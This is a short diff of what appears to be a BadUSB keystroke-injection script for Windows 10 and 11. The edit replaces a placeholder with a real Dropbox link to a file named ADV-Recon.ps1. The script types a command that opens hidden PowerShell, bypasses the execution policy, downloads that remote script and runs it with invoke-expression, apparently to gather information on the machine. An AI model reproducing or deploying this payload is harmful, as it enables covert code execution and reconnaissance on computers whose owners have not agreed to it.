@@ -8,7 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://www.dropbox.com/scl/fi/4djuoga7whgrqd4mjjqh1/ADV-Recon.ps1?rlkey=1cvn99ua7nbmbgodtztf4os0t&st=9uga82wk&dl=1; invoke-expression $pl
 ENTER
 
 REM     Remember to replace the link with your DropBox shared link for the intended file to download
